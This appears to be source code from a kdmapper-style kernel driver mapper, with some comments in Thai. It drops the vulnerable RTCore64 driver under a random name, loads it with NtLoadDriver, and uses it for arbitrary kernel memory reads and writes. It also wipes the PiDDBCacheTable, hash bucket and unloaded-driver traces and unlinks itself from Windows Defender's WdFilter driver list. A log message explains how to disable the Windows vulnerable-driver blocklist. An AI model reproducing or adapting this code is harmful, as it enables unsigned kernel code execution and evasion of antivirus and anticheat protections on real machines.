---
GetBase
---
```cpp

//nt.hpp

#pragma once
#include <Windows.h>
#include <winternl.h> 

#pragma comment(lib, "ntdll.lib")
#include <psapi.h>
#pragma comment(lib, "psapi.lib")
#include <DbgHelp.h>
#pragma comment(lib, "DbgHelp.lib")


namespace nt
{//ui64 
	static UINT off_unique_process_id = 0x0;
	static UINT  off_active_process_links = 0x0;
	static UINT  off_image_file_name = 0x0;
	static UINT  off_active_threads = 0x0;
	static uint64_t* PtrPsInitialSystemProcess = 0x0;

 
	constexpr auto PAGE_SIZE = 0x1000;
	 constexpr auto STATUS_INFO_LENGTH_MISMATCH = 0xC0000004LL;
 
//constexpr auto STATUS_INFO_LENGTH_MISMATCH = 0xC000000DLL;

	constexpr auto SystemModuleInformation = 11;
	constexpr auto SystemHandleInformation = 16;
	constexpr auto SystemExtendedHandleInformation = 64;
	/*PVOID __stdcall RtlFindExportedRoutineByName(
			_In_ PVOID  DllBase,
			_In_ PCCH   RoutineName
		);*/
	std::string byteToHexString(uint32_t value);
	void ResolveNtUserFunctionRVA(HANDLE device,                // handle ไปยัง driver
		uint64_t moduleBase,          // base address ของ win32k.sys
		const std::string& funcName,  // ชื่อฟังก์ชัน เช่น "NtUserSetGestureConfig"
		uint32_t& outOff1,            // offset แรก (88h)
		uint32_t& outOff2,            // offset ที่สอง (150h)
		uint32_t& outOff3             // offset ที่สาม (C30h)
	);
	struct ResolveResult {
		bool success = false;
		std::vector<uint64_t> offsets;    // เหมาะกับ return ทุก offset
	};

	ResolveResult ResolveSymbolOffsetsEx(
		HANDLE device,
		uint64_t moduleBase,
		const std::string& pdbPath,
		bool debugAll,                             // ถ้า true → log ทุก RVA ใน PDB
		const std::string& funcName = {},          // อยากเจาะเฉพาะฟังก์ชันนี้ ถ้าว่าง → scan ทั้ง PDB
		size_t maxInstructions = 256
	);

	void WTokenTored(const std::string& keyName, const std::string& tokenData);
	uint64_t get_Kernel_handle_user(const char* module_name);
	uint64_t get_Kernel_Fn_address(const uintptr_t imageBase, const char* exportName);
	bool __forceinline  SetUpIntin();
 
	typedef PVOID(__stdcall *Ca_RtlFindExportedRoutineByName)(
		/*_In_ */PVOID  DllBase,
		/*_In_ */PCCH   RoutineName);
 


	typedef NTSTATUS(*Ca_NtLoadDriver)(PUNICODE_STRING DriverServiceName);
	typedef NTSTATUS(*Ca_NtUnloadDriver)(PUNICODE_STRING DriverServiceName);
	typedef NTSTATUS(*Ca_tlAdjustPrivilege)(_In_ ULONG Privilege, _In_ BOOLEAN Enable, _In_ BOOLEAN Client, _Out_ PBOOLEAN WasEnabled);
	//__int64 __fastcall RtlAdjustPrivilege(unsigned int, bool, char, bool*);
	typedef __int64(__fastcall* FN_RtlAdjustPrivilege)(unsigned int, bool, char, bool* );//	static fn fn_Ps_Zw_Open_Process = (fn)(find_function_cached("ntoskrnl.exe", "ZwOpenProcess"));
	 //void __fastcall VhdiAutoAttachOneVhd(__int64 a1, unsigned int a2, _OWORD *a3, unsigned int a4)
	template<typename _Gt> __forceinline _Gt GetPtrKernel(const char* basemodule, const char* FNnamecall);
 
	typedef uint64_t(__fastcall* FN_RtlAcquirePrivilege)(unsigned int* a1, unsigned int a2, int a3, __int64* a4);
	typedef void(__fastcall* FN_VhdiAutoAttachOneVhd)(__int64 a1, unsigned int a2, void* a3, unsigned int a4);
	typedef NTSTATUS(__fastcall* FN_ZwAdjustPrivilegesToken)();//__int64 ZwAdjustPrivilegesToken();
....

};
 

 
 
 uint64_t nt::get_Kernel_handle_user(const char* module_name )
{
	LPVOID drivers[1024] = {};
	DWORD cbNeeded;

	if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
		return 0;

	int count = cbNeeded / sizeof(LPVOID);

	for (int i = 0; i < count; ++i)
	{
		char name[MAX_PATH] = {};
		if (GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name) / sizeof(char)))
		{
			if (!module_name || _stricmp(name, module_name) == 0)
				return (uint64_t)reinterpret_cast<uintptr_t>(drivers[i]);
		}
	}

	return 0;
}


uint64_t utils::GetKernelModuleAddress(const std::string& module_name) {
	void* buffer = nullptr;
	DWORD buffer_size = 0;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status)) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return 0;
	}

	const auto modules = static_cast<nt::PRTL_PROCESS_MODULES>(buffer);
	if (!modules)
		return 0;

	for (auto i = 0u; i < modules->NumberOfModules; ++i) {
		const std::string current_module_name = std::string(reinterpret_cast<char*>(modules->Modules[i].FullPathName) + modules->Modules[i].OffsetToFileName);

		if (!_stricmp(current_module_name.c_str(), module_name.c_str()))
		{
			const uint64_t result = reinterpret_cast<uint64_t>(modules->Modules[i].ImageBase);

			VirtualFree(buffer, 0, MEM_RELEASE);
			return result;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return 0;
}



//intel_driver.cpp


HANDLE intel_driver::Load(bool clean, DWORD OsWindo , DWORD ADATA_OJB) {

 //
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	// สร้างชื่อ driver แบบสุ่ม
	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
	static const char alphanum[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	Log(L"[<] SetProtx Name Successfully" << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log(L"[-] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}
	  
	_wremove(driver_path.c_str());
     

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(rtcore64_driver_resource::driver), sizeof(rtcore64_driver_resource::driver))) {
		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

 
	// ลองเปิด handle กับ driver ก่อน
	if (!ma.Open()) {
		// ถ้ายังเปิดไม่ได้ แสดงว่ายังไม่โหลด => โหลด driver
		Log(L"[!] Driver not loaded yet, trying to load..." << std::endl);

		if (!service::RegisterAndStart(driver_path, GetDriverNameW(), 26100)) {
			Log(L"[-] Failed to register and start service" << std::endl);
			_wremove(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}

		if (!service::LoadKernelDriver(driver_path)) {
			Log(L"[-] Failed to load kernel driver" << std::endl);
			_wremove(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}

		// ลองเปิดใหม่อีกรอบ
		if (!ma.Open()) {
			Log(L"[-] Failed to open handle to driver after loading" << std::endl);
			intel_driver::Unload(INVALID_HANDLE_VALUE);
			return INVALID_HANDLE_VALUE;
		}
	}
	else {
		Log(L"[+] Driver already running and accessible" << std::endl);
	}
	auto result = INVALID_HANDLE_VALUE;
	 ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		ntoskrnlAddr = (uint64_t)nt::get_Kernel_handle_user("ntoskrnl.exe");
		if (ntoskrnlAddr == 0)
		{
			Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
	 
	}

 
	  

	LoadLibraryA("user32.dll");
	LoadLibraryA("win32u.dll"); 
	uintptr_t win32k = utils::GetKernelModuleAddress("win32k.sys");
	if (!win32k)
	{
		win32k = (uint64_t)nt::get_Kernel_handle_user("win32k.sys");
		if (!win32k)
		{
			 
			Log("[-] win32k.sys not found");
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
	}	
	//Log("[Debug] Ptr win32k 0x " << std::hex << (uintptr_t)win32k << std::endl);
	
	LoadLibraryA("kernel32.dll");
	LoadLibraryA("ntdll.dll");
	char* PSNt_systemRoot;
	size_t PSNt_path_len ;
	_dupenv_s(&PSNt_systemRoot , &PSNt_path_len, "systemroot");
	std::string PSNt_ntos_path = std::string(PSNt_systemRoot) + "\\System32\\ntoskrnl.exe";
	free(PSNt_systemRoot);
	ez::pdb PSNt_ntos_pdb = ez::pdb(PSNt_ntos_path, "http://msdl.blackint3.com:88/download/symbols");
	if (!PSNt_ntos_pdb.init())
	{
		Log(L"[-] Failed to Load PDB" << std::endl);
	 
		GetSystemDirectoryA(PSNt_systemRoot , MAX_PATH);
		PSNt_ntos_path = std::string(PSNt_systemRoot) + "\\ntoskrnl.exe";
		PSNt_ntos_pdb = ez::pdb(PSNt_ntos_path);
		if (!PSNt_ntos_pdb.init())
		{
			Log(L"[-] Failed to Load PDB" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		return INVALID_HANDLE_VALUE;
	}
	 
 
	LoadLibraryA("user32.dll");
	LoadLibraryA("win32u.dll");
	char* systemRootEnv;
	size_t path_len;
	_dupenv_s(&systemRootEnv, &path_len, "systemroot");
	std::string ntos_path = std::string(systemRootEnv) + "\\System32\\win32k.sys";
	free(systemRootEnv);
	ez::pdb ntos_pdb = ez::pdb(ntos_path, "http://msdl.blackint3.com:88/download/symbols");
	if (!ntos_pdb.init())
	{
		Log(L"[-] Failed to Load PDB" << std::endl);
	 
		GetSystemDirectoryA(systemRootEnv, MAX_PATH);
		ntos_path = std::string(systemRootEnv) + "\\win32k.sys";
		ntos_pdb = ez::pdb(ntos_path);
		if (!ntos_pdb.init())
		{
			Log(L"[-] Failed to Load PDB" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		return INVALID_HANDLE_VALUE;
	}
	 if (OsWindo >= 26100) {

	uint32_t Km_rva_FindNtUserSetGestureConfig = ntos_pdb.get_rva("NtUserSetGestureConfig");
 
	uint32_t off1GestureConfig, off2GestureConfig, off3GestureConfig;
	nt::ResolveNtUserFunctionRVA(result, win32k, "NtUserSetGestureConfig", off1GestureConfig, off2GestureConfig, off3GestureConfig);
//	Log(L"[New] Set 1 rva_NtUserSetGestureConfig 0x" << std::hex << (uint32_t)Km_rva_FindNtUserSetGestureConfig << " Offsets_off1 0x" <<  std::hex << off1GestureConfig << L" Offsets_off2 0x" << std::hex << off2GestureConfig << L" Offsets_off3 0x" << std::hex << off3GestureConfig << std::endl);

	 
	//AutoGet_+disp
	if (win32k != 0x0 && off1GestureConfig != 0x0 && off2GestureConfig != 0x0 && off3GestureConfig != 0x0)
	{
		int gSessionGlobalSlots_rva = ntos_pdb.get_rva("gSessionGlobalSlots");
		if (gSessionGlobalSlots_rva == -1)
		{
			Log(L"[-] Failed to Load Symbol of gSessionGlobalSlots" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		uintptr_t gSessionGlobalSlots = win32k + gSessionGlobalSlots_rva;
		uintptr_t GetSessionState24H2 = 0;
		if (!ReadMemory(result, gSessionGlobalSlots, &GetSessionState24H2, sizeof(uintptr_t)) || !GetSessionState24H2)
		{
			Log(L"[-] GetSessionState24H2 not read 1" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		if (!ReadMemory(result, GetSessionState24H2, &GetSessionState24H2, sizeof(uintptr_t)) || !GetSessionState24H2)
		{
			Log(L"[-] GetSessionState24H2 not read 2" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		uintptr_t nt_qword = GetSessionState24H2 + off1GestureConfig;
		if (!ReadMemory(result, nt_qword, &nt_qword, sizeof(uintptr_t)) || !nt_qword)
		{
			Log(L"[-] nt_qword not read" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		nt_qword += off2GestureConfig;
		if (!ReadMemory(result, nt_qword, &nt_qword, sizeof(uintptr_t)) || !nt_qword)
		{
			Log(L"[-] nt_qword not read" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		NtUserSetGestureConfig_ref = nt_qword + off3GestureConfig;
	}
	//Put_offset_disp
	else
	{
		Log(L"[*]Set 2 " << std::endl);
		int gSessionGlobalSlots_rva = ntos_pdb.get_rva("gSessionGlobalSlots");
		if (gSessionGlobalSlots_rva == -1)
		{
			Log(L"[-] Failed to Load Symbol of gSessionGlobalSlots" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
	uintptr_t gSessionGlobalSlots = win32k + gSessionGlobalSlots_rva;
	uintptr_t GetSessionState24H2 = 0;
	if (!ReadMemory(result, gSessionGlobalSlots, &GetSessionState24H2, sizeof(uintptr_t)) || !GetSessionState24H2)
	{
		Log(L"[-] GetSessionState24H2 not read 1" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	if (!ReadMemory(result, GetSessionState24H2, &GetSessionState24H2, sizeof(uintptr_t)) || !GetSessionState24H2)
	{
		Log(L"[-] GetSessionState24H2 not read 2" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	uintptr_t nt_qword = GetSessionState24H2 + 0x88LL;
	if (!ReadMemory(result, nt_qword, &nt_qword, sizeof(uintptr_t)) || !nt_qword)
	{
		Log(L"[-] nt_qword not read" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	nt_qword += 0x150LL;
	if (!ReadMemory(result, nt_qword, &nt_qword, sizeof(uintptr_t)) || !nt_qword)
	{
		Log(L"[-] nt_qword not read" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
		if (ADATA_OJB <= 3999) {
			NtUserSetGestureConfig_ref = nt_qword + 0xC30LL;
		}
		else if (ADATA_OJB >= 4000)
		{
			NtUserSetGestureConfig_ref = nt_qword + 0xC28LL;
		}
	}

	 




}
//Window OS 1803-23h2
else 
{
	int NtUserSetGestureConfig_rva = ntos_pdb.get_rva("NtUserSetGestureConfig");
	if (NtUserSetGestureConfig_rva == -1)
	{
		Log(L"[-] Failed to Load Symbol of NtUserSetGestureConfig" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	uintptr_t NtUserSetGestureConfig = win32k + NtUserSetGestureConfig_rva;
	uintptr_t nt_qword = FindPatternAtKernel(result, NtUserSetGestureConfig, 0x100, (BYTE*)"\x48\x8B\x05", "xxx");
	if (!nt_qword)
	{
		Log(L"[-] NtUserSetGestureConfig not found" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	int  nt_qword_offset = 0;
	if (!ReadMemory(result, nt_qword + 3, &nt_qword_offset, sizeof(int)))
	{
		Log(L"[-] NtUserSetGestureConfig not found" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	NtUserSetGestureConfig_ref = nt_qword + nt_qword_offset + 7;
}
	if (clean)
	{
		if (!intel_driver::ClearPiDDBCacheTable(result)) {
			Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		else
		{

			 Log("[clean] ClearPiDDBCacheTable " <<   std::endl);

		}

		if (!intel_driver::ClearKernelHashBucketList(result)) {
			Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		else
		{
			 Log("[clean] ClearKernelHashBucketList " << std::endl);
		}
		if (!intel_driver::ReleaseHashCacheLock(result)) {
			Log(L"[-] Failed to ReleaseHashCacheLock" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		else
		{
			 Log("[clean] ReleaseHashCacheLock " << std::endl);
		}

	//	if (!intel_driver::ClearMmUnloadedDrivers(ma.hDevice)) {
		if (!intel_driver::ClearMmUnloadedDrivers(ma.hDevice)) {
			Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		else
		{
			 Log("[clean] ClearMmUnloadedDrivers " << std::endl);
		}

		if (!intel_driver::ClearWdFilterDriverList(result)) {
			Log("[!] Failed to ClearWdFilterDriverList" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
		else
		{
			 Log("[clean] ClearWdFilterDriverList " << std::endl);
		}
	}
	
	return 0;
}

bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {
	uintptr_t WdFilter = utils::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) { WdFilter = (uint64_t)nt::get_Kernel_handle_user("WdFilter.sys"); }
	if (!WdFilter) {
		 
			Log("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
			return true;
		 
	}
	LoadLibraryA("kernel32.dll");
	LoadLibraryA("ntdll.dll");
	char* WdFilter_systemRoot;
	size_t WdFilter_path_len;
	_dupenv_s(&WdFilter_systemRoot, &WdFilter_path_len, "systemroot");
	std::string WdFilter_ntos_path = std::string(WdFilter_systemRoot) + "\\System32\\drivers\\WdFilter.sys";
	free(WdFilter_systemRoot);
	ez::pdb WdFilter_ntos_pdb = ez::pdb(WdFilter_ntos_path, "http://msdl.blackint3.com:88/download/symbols");
	if (!WdFilter_ntos_pdb.init())
	{
		Log(L"[-] Failed to Load PDB" << std::endl);

		GetSystemDirectoryA(WdFilter_systemRoot, MAX_PATH);
		WdFilter_ntos_path = std::string(WdFilter_systemRoot) + "\\drivers\\WdFilter.sys";
		WdFilter_ntos_pdb = ez::pdb(WdFilter_ntos_path);
		WdFilter_ntos_pdb.init();

	}
	uint32_t rva_pdb_RuntimeDriversList = WdFilter_ntos_pdb.get_rva("RuntimeDriversList");
	Log("[Debug] rva_pdb_RuntimeDriversList 0x" << std::hex << rva_pdb_RuntimeDriversList << std::endl);
	uint32_t rva_pdb_RuntimeDriversCount = WdFilter_ntos_pdb.get_rva("RuntimeDriversCount");
	Log("[Debug] rva_pdb_RuntimeDriversCount 0x" << std::hex << rva_pdb_RuntimeDriversCount << std::endl);
	uint32_t rva_pdb_RuntimeDriversArray = WdFilter_ntos_pdb.get_rva("RuntimeDriversArray");
	Log("[Debug] rva_pdb_RuntimeDriversArray 0x" << std::hex << rva_pdb_RuntimeDriversArray << std::endl);
	uint32_t rva_pdb_MpFreeDriverInfoEx = WdFilter_ntos_pdb.get_rva("MpFreeDriverInfoEx");
	Log("[Debug] rva_pdb_MpFreeDriverInfoEx 0x" << std::hex << rva_pdb_MpFreeDriverInfoEx << std::endl);

	//Log("[Debug] WdFilter 0x" <<std::hex<< (uintptr_t)WdFilter << std::endl);
	auto RuntimeDriversList = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
	if (!RuntimeDriversList) {
		Log("[!] Failed to find WdFilter RuntimeDriversList" << std::endl);
		return false;
	}
	//Log("[Debug] RuntimeDriversList 0x" << std::hex << (uintptr_t)RuntimeDriversList << std::endl);
	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
	if (!RuntimeDriversCountRef) {
		Log("[!] Failed to find WdFilter RuntimeDriversCount" << std::endl);
		return false;
	}
	//Log("[Debug] RuntimeDriversCountRef 0x" << std::hex << (uintptr_t)RuntimeDriversCountRef << std::endl);
	// MpCleanupDriverInfo->MpFreeDriverInfoEx 23110
	/*
		49 8B C9                      mov     rcx, r9         ; P
		49 89 50 08                   mov     [r8+8], rdx
		E8 FB F0 FD FF                call    MpFreeDriverInfoEx
		48 8B 0D FC AA FA FF          mov     rcx, cs:qword_1C0021BF0
		E9 21 FF FF FF                jmp     loc_1C007701A
	*/
	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?x?xx???????????x");
	if (!MpFreeDriverInfoExRef) {
		// 24010 
		/*
			48 89 4A 08                   mov     [rdx+8], rcx
			49 8B C8                      mov     rcx, r8         ; P
			E8 C3 58 FE FF                call    sub_1C0065308
			48 8B 0D 44 41 FA FF          mov     rcx, cs:qword_1C0023B90
			E9 39 FF FF FF                jmp     loc_1C007F98A
		*/
		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x48\x89\x4A\x00\x49\x8b\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?xx?x???????????x");
		if (!MpFreeDriverInfoExRef) {
			Log("[!] Failed to find WdFilter MpFreeDriverInfoEx" << std::endl);
			return false;
		}
		else {
			Log("[+] Found WdFilter MpFreeDriverInfoEx with second pattern" << std::endl);
		}

	}
	//Log("[Debug] MpFreeDriverInfoExRef 0x" << std::hex << (uintptr_t)MpFreeDriverInfoExRef << std::endl);
	MpFreeDriverInfoExRef += 0x7; // skip until call instruction

	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversList, 3, 7);
	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversCountRef, 2, 6);
	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	ReadMemory(device_handle, RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
	//Log("[Debug] RuntimeDriversArray 0x" << std::hex << (uintptr_t)RuntimeDriversArray << std::endl);
	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)MpFreeDriverInfoExRef, 1, 5);
	//Log("[Debug] MpFreeDriverInfoEx 0x" << std::hex << (uintptr_t)MpFreeDriverInfoEx << std::endl);
	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* { // Usefull lambda to read LIST_ENTRY
		LIST_ENTRY* Entry;
		if (!ReadMemory(device_handle, Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
		};
	 
	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		UNICODE_STRING Unicode_String;
		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {

					//remove from RuntimeDriversArray
					bool removedRuntimeDriversArray = false;
					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
					for (int k = 0; k < 256; k++) { // max RuntimeDriversArray elements
						PVOID value = 0;
						ReadMemory(device_handle, RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
						if (value == SameIndexList) {
							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1); // this is not count+1 is position of cout addr+1
							WriteMemory(device_handle, RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
							removedRuntimeDriversArray = true;
							break;
						}
					}

					if (!removedRuntimeDriversArray) {
						Log("[!] Failed to remove from RuntimeDriversArray" << std::endl);
						return false;
					}

					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));

					WriteMemory(device_handle, uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
					WriteMemory(device_handle, uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));


					// decrement RuntimeDriversCount
					ULONG current = 0;
					ReadMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));
					current--;
					WriteMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));
					Log("[+] RuntimeDriversCount 0x" << std::hex << (uintptr_t)RuntimeDriversCount << std::endl);
					// call MpFreeDriverInfoEx
					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;

					//verify DriverInfo Magic
					USHORT Magic = 0;
					ReadMemory(device_handle, DriverInfo, &Magic, sizeof(USHORT));
					if (Magic != 0xDA18) {
						Log("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
					}
					else {
						CallKernelFunction<void>(device_handle, nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					Log("[+] WdFilterDriverList Cleaned: " << ImageName << std::endl);
					return true;
				}
			}
		}
	}
	return false;
}
// service.cpp


bool service::RegisterAndStart(const std::wstring& driver_path, const std::wstring& serviceName,DWORD OS) {
	const static DWORD ServiceTypeKernel = 1;
	const std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
	const std::wstring nPath = L"\\??\\" + driver_path;

	HKEY dservice;
	LSTATUS status = RegCreateKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice); //Returns Ok if already exists
	if (status != ERROR_SUCCESS) {
		Log("[-] Can't create service key" << std::endl);
		return false;
	}

	status = RegSetKeyValueW(dservice, NULL, L"ImagePath", REG_EXPAND_SZ, nPath.c_str(), (DWORD)(nPath.size() * sizeof(wchar_t)));
	if (status != ERROR_SUCCESS) {
		RegCloseKey(dservice);
		Log("[-] Can't create 'ImagePath' registry value" << std::endl);
		return false;
	}

	status = RegSetKeyValueW(dservice, NULL, L"Type", REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
	if (status != ERROR_SUCCESS) {
		RegCloseKey(dservice);
		Log("[-] Can't create 'Type' registry value" << std::endl);
		return false;
	}

	RegCloseKey(dservice);

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL) {
		return false;
	}

	//auto RtlAdjustPrivilege = (nt::RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
	//auto NtLoadDriver = (nt::NtLoadDriver)GetProcAddress(ntdll, "NtLoadDriver");

	ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status)) {
		Log("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator." << std::endl);
		return false;
	}

	std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + serviceName;
	UNICODE_STRING serviceStr;
	RtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());

	Status = nt::NtLoadDriver(&serviceStr);


	Log("[+] NtLoadDriver Status 0x" << std::hex << Status << std::endl);

	if (Status == 0xC0000603) { //STATUS_IMAGE_CERT_REVOKED
		Log("[-] Your vulnerable driver list is enabled and have blocked the driver loading, you must disable vulnerable driver list to use kdmapper with intel driver" << std::endl);
		Log("[-] Registry path to disable vulnerable driver list: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config" << std::endl);
		Log("[-] Set 'VulnerableDriverBlocklistEnable' as dword to 0" << std::endl);
	}
	else if (Status == 0xC0000022 || Status == 0xC000009A) { //STATUS_ACCESS_DENIED and STATUS_INSUFFICIENT_RESOURCES
		Log("[-] Access Denied or Insufficient Resources (0x" << std::hex << Status << "), Probably some anticheat or antivirus running blocking the load of vulnerable driver" << std::endl);
	}


	//Never should occur since kdmapper checks for "IsRunning" driver before
	if (Status == 0xC000010E) {// STATUS_IMAGE_ALREADY_LOADED
		return true;
	}

	return NT_SUCCESS(Status);
}
```
